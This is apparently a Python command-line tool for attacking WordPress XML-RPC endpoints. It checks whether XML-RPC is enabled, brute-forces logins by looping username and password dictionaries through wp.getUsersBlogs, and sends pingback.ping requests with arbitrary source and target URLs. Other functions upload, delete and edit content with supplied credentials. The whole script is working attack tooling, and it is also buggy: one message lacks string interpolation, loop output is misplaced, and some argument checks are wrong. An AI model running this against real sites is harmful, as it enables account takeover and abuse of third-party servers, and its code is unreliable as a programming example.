import base64
import requests, argparse, sys

def detecction(url):

    print("\n\033[94m[*]\033[0m You have chosen the detection mode\n")
    print("\033[94m[*]\033[0m I am going to proceed to send a request to the server to check if it is activated at the proposed address\n")

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    try:
        response = requests.post(url,headers=headers)  

        if response.status_code == 200:
            print("\033[92m[*]\033[0m XML-RPC is enabled on this site.")
           
        else:
            print("\033[91m[*]\033[0m XML-RPC is NOT enabled on this site.")
    
    except requests.exceptions.RequestException as e:
        print(f"\033[91m[*]\033 Could not connect to the site: {e}")

def listMethods(url):


    print("\n\033[94m[*]\033[0m You have chosen the listMethods mode\n")

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    # Build the XML-RPC request with the current username and password values
    xml_data = f"""
    <methodCall>
        <methodName>system.listMethods</methodName>
        <params></params>
    </methodCall>
    """
    response = requests.post(url, data=xml_data,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)# Agrega un encabezado User-Agent
    
    

def bruteforce(url, users, passws):
    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    print("\n\033[94m[*]\033[0m You have chosen the brute force mode\n")
    print("\033[94m[*]\033[0m I will proceed to send the requests with the dictionaries provided\n")


    if users == None or users == None:
        print("\n\t The use of the following additional flags is necessary")
        print("\t\t--luser [USER LIST]")
        print("\t\t--lpasswword [PASSWDORD LIST]\n")
        sys.exit()

    with open(users) as user_file, open(passws) as password_file:
        usernames = user_file.read().splitlines()
        passwords = password_file.read().splitlines()

        for password in passwords:
            for username in usernames:
                # Build the XML-RPC request with the current username and password values
                xml_data = f"""
                <methodCall>
                  <methodName>wp.getUsersBlogs</methodName>
                  <params>
                    <param>
                        <value><string>{username}</string></value>
                    </param>
                    <param>
                        <value><string>{password}</string></value>
                    </param>
                  </params>
                </methodCall>
                """
                response = requests.post(url, data=xml_data,headers=headers)
                print("-----------------------------------------------------------")
                error = """<name>faultCode</name>
      <value><int>403</int></value>"""
                if error in response.text:
                    pass
                else:
                    print("\033[92m[*]\033[0m {username} and {password} is valid on this site")
                    return
            
                print("\033[91m[*]\033[0m No username or password matched on this site")


def getCapabilities(url):

    print("\n\033[94m[*]\033[0m You have chosen the getCapabilities mode\n")

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    # Build the XML-RPC request
    xml_data = f"""
    <methodCall>
        <methodName>system.getCapabilities</methodName>
        <params></params>
    </methodCall>
    """
    response = requests.post(url, data=xml_data,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)

def sayHello(url):
    print("\n\033[94m[*]\033[0m You have chosen the sayHello mode\n")

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    # Build the XML-RPC request
    xml_data = f"""
    <methodCall>
        <methodName>demo.sayHello</methodName>
        <params></params>
    </methodCall>
    """
    response = requests.post(url, data=xml_data,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)

def pingBack(url, args):
    print("\n\033[94m[*]\033[0m You have chosen the pincgBack mode\n")

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    if args.source_url == None or args.target_url == None:
        print("\n\t The use of the following additional flags is necessary")
        print("\t\t--source_url [URL]")
        print("\t\t--target_url [URL]\n")
        sys.exit()

    source_url = args.source_url
    target_url = args.target_url

    # Build the XML-RPC request con los valores actuales de username y password
    xml_data = f"""
    <methodCall>
        <methodName>pingback.ping</methodName>
        <params>
            <param>
                <value><string>{source_url}</string></value>
            </param>
            <param>
                <value><string>{target_url}</string></value>
            </param>
        </params>
    </methodCall>
    """
    response = requests.post(url, data=xml_data,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)

def deleteFile(url, args):

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    if args.user == None or args.password == None or args.id_blog == None:
        print("\n\t The use of the following additional flags is necessary")
        print("\t\t--user [USER]")
        print("\t\t--password [PASSWORD]")
        print("\t\t--id_blog [ID_BLOG]\n")
        sys.exit()

    username = args.user
    password = args.password
    id_blog = args.id_blog



    # Build the XML-RPC request
    xml_data = f"""
    <methodCall>
    <methodName>wp.deleteFile</methodName>
    <params>
        <param><value><string>{username}</string></value></param>
        <param><value><string>{password}</string></value></param>
        <param><value><string>{id_blog}</string></value></param>
    </params>
</methodCall>
    """
    response = requests.post(url, data=xml_data,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)

def uploadFile(url, args):

   # Add a User-Agent header

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    if args.user == None or args.password == None or args.file_path == None or args.file_name == None or args.file_type == None:
        print("\n\t The use of the following additional flags is necessary")
        print("\t\t--user [USER]")
        print("\t\t--password [PASSWORD]")
        print("\t\t--file_path [PATH]")
        print("\t\t--file_name [FILE]")
        print("\t\t--file_type [TYPE]\n")
        
        sys.exit()

    username = args.user
    password = args.password
    file_path = args.file_path  
    file_name = args.file_name
    file_type = args.file_type
    
    # Read the binary content of the file
    with open(file_path, 'rb') as file:
        file_content = file.read()
        file_data = base64.b64encode(file_content).decode('utf-8')
    
    # Build the XML-RPC request manually for wp.uploadFile
    xml_payload = """<?xml version="1.0"?>
    <methodCall>
        <methodName>wp.uploadFile</methodName>
        <params>
            <param><value><string>{}</string></value></param>
            <param><value><string>{}</string></value></param>
            <param><value><string>{}</string></value></param>
            <param>
                <value>
                    <base64>{}</base64>
                </value>
            </param>
        </params>
    </methodCall>
    """.format(username, password, {
        'name': file_name,
        'type': file_type,
        'bits': file_data,
        'overwrite': False  # You can adjust this according to your needs
    })

    response = requests.post(url, data=xml_payload,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)


def getAuthors(url, args):

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    if args.user == None or args.password == None:
        print("\n\t The use of the following additional flags is necessary")
        print("\t\t--user [USER]")
        print("\t\t--password [PASSWORD]\n")        
        sys.exit()

    username = args.user
    password = args.password

    # Build the XML-RPC request manually for wp.getAuthors
    xml_payload = """<?xml version="1.0"?>
    <methodCall>
        <methodName>wp.getAuthors</methodName>
        <params>
            <param><value><string>{}</string></value></param>
            <param><value><string>{}</string></value></param>
        </params>
    </methodCall>
    """.format(username, password)

    response = requests.post(url, data=xml_payload,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)
    

def editProfile(url, args):

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    if args.user == None or args.password == None or args.id_user == None or args.new_display_name == None or args.new_first_name == None or args.new_last_name == None or args.new_email == None:
        print("\n\t The use of the following additional flags is necessary")
        print("\t\t--user [USER]")
        print("\t\t--password [PASSWORD]")
        print("\t\t--id_user [ID_USER]")
        print("\t\t--new_display_name [DISPLAY NAME]")
        print("\t\t--new_last_name [FIRST NAME]")
        print("\t\t--new_last_name [LAST NAME]")
        print("\t\t--new_email [EMAIL]\n")        
        sys.exit()

    username = args.user
    password = args.password
    id_user = args.id_user
    new_display_name = args.new_display_name
    new_first_name = args.new_first_name
    new_last_name = args.new_last_name
    new_email = args.new_email

    # Build the XML-RPC request manually for wp.editProfile
    xml_payload = """<?xml version="1.0"?>
    <methodCall>
        <methodName>wp.editProfile</methodName>
        <params>
            <param><value><string>{}</string></value></param>
            <param><value><string>{}</string></value></param>
            <param><value><struct>
                <member><name>user_id</name><value><string>{}</string></value></member>
                <member><name>display_name</name><value><string>{}</string></value></member>
                <member><name>first_name</name><value><string>{}</string></value></member>
                <member><name>last_name</name><value><string>{}</string></value></member>
                <member><name>email</name><value><string>{}</string></value></member>
            </struct></value></param>
        </params>
    </methodCall>
    """.format(username, password, id_user, new_display_name, new_first_name, new_last_name, new_email)

    response = requests.post(url, data=xml_payload,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)
              

def getProfile(url, args):

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    if args.user == None or args.password == None:
        print("\n\t The use of the following additional flags is necessary")
        print("\t\t--user [USER]")
        print("\t\t--password [PASSWORD]\n")    
        sys.exit()

    username = args.user
    password = args.password

    xml_payload = """<?xml version="1.0"?>
    <methodCall>
        <methodName>wp.getProfile</methodName>
        <params>
            <param><value><string>{}</string></value></param>
            <param><value><string>{}</string></value></param>
        </params>
    </methodCall>
    """.format(username, password)

    response = requests.post(url, data=xml_payload,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)

def getUsers(url, args):

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    if args.user == None or args.password == None:
        print("\n\t The use of the following additional flags is necessary")
        print("\t\t--user [USER]")
        print("\t\t--password [PASSWORD]\n")    
        sys.exit()

    username = args.user
    password = args.password

    xml_payload = """<?xml version="1.0"?>
    <methodCall>
        <methodName>wp.getUsers</methodName>
        <params>
            <param><value><string>{}</string></value></param>
            <param><value><string>{}</string></value></param>
        </params>
    </methodCall>
    """.format(username, password)

    response = requests.post(url, data=xml_payload,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)


def getUser(url, args):

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    if args.user == None or args.password == None or args.id_user == None:
        print("\n\t The use of the following additional flags is necessary")
        print("\t\t--user [USER]")
        print("\t\t--password [PASSWORD]")
        print("\t\t--id_user [ID_USER]\n")    
        sys.exit()

    username = args.user
    password = args.password
    user_id = args.id_user  

    # Build the XML-RPC request manually for wp.getUser
    xml_payload = """<?xml version="1.0"?>
    <methodCall>
        <methodName>wp.getUser</methodName>
        <params>
            <param><value><string>{}</string></value></param>
            <param><value><string>{}</string></value></param>
            <param><value><int>{}</int></value></param>
        </params>
    </methodCall>
    """.format(username, password, user_id)

    response = requests.post(url, data=xml_payload,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)


def getPosts(url, args):

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    if args.user == None or args.password == None or args.num_posts == None:
        print("\n\t The use of the following additional flags is necessary")
        print("\t\t--user [USER]")
        print("\t\t--password [PASSWORD]")
        print("\t\t--num_posts [MAX NUMBER OF POSTS]\n")    
        sys.exit()

    username = args.user
    password = args.password
    num_posts = args.num_posts  

    # Build the XML-RPC request manually for wp.getPosts
    xml_payload = """<?xml version="1.0"?>
    <methodCall>
        <methodName>wp.getPosts</methodName>
        <params>
            <param><value><string>{}</string></value></param>
            <param><value><string>{}</string></value></param>
            <param>
                <value>
                    <struct>
                        <member>
                            <name>number</name>
                            <value><int>{}</int></value>
                        </member>
                    </struct>
                </value>
            </param>
        </params>
    </methodCall>
    """.format(username, password, num_posts)

    response = requests.post(url, data=xml_payload,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)

def getPost(url, args):

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    if args.user == None or args.password == None or args.id_user == None:
        print("\n\t The use of the following additional flags is necessary")
        print("\t\t--user [USER]")
        print("\t\t--password [PASSWORD]")
        print("\t\t--post_id [POST_ID]\n")    
        sys.exit()

    username = args.user
    password = args.password
    post_id = args.post_id  

    # Build the XML-RPC request manually for wp.getPost
    xml_payload = """<?xml version="1.0"?>
    <methodCall>
        <methodName>wp.getPost</methodName>
        <params>
            <param><value><string>{}</string></value></param>
            <param><value><string>{}</string></value></param>
            <param><value><int>{}</int></value></param>
        </params>
    </methodCall>
    """.format(username, password, post_id)

    response = requests.post(url, data=xml_payload,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)


def deletePost(url, args):

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    if args.user == None or args.password == None or args.id_user == None:
        print("\n\t The use of the following additional flags is necessary")
        print("\t\t--user [USER]")
        print("\t\t--password [PASSWORD]")
        print("\t\t--post_id [POST_ID]\n")    
        sys.exit()

    username = args.user
    password = args.password
    post_id = args.post_id  

    # Build the XML-RPC request manually for wp.deletePost
    xml_payload = """<?xml version="1.0"?>
    <methodCall>
        <methodName>wp.deletePost</methodName>
        <params>
            <param><value><string>{}</string></value></param>
            <param><value><string>{}</string></value></param>
            <param><value><int>{}</int></value></param>
        </params>
    </methodCall>
    """.format(username, password, post_id)

    response = requests.post(url, data=xml_payload,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)


def getUsersBlogs(url, args):

    # Add a User-Agent header
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
        'Content-Type': 'text/xml',
    }

    if args.user == None or args.password == None or args.id_user == None:
        print("\n\t The use of the following additional flags is necessary")
        print("\t\t--user [USER]")
        print("\t\t--password [PASSWORD]")  
        sys.exit()

    username = args.user
    password = args.password

    xml_payload = """<?xml version="1.0"?>
    <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
            <param><value><string>{}</string></value></param>
            <param><value><string>{}</string></value></param>
        </params>
    </methodCall>
    """.format(username, password)

    response = requests.post(url, data=xml_payload,headers=headers)

    print("\033[92mRESPONSE\033[0m")

    print("\n" + response.text)
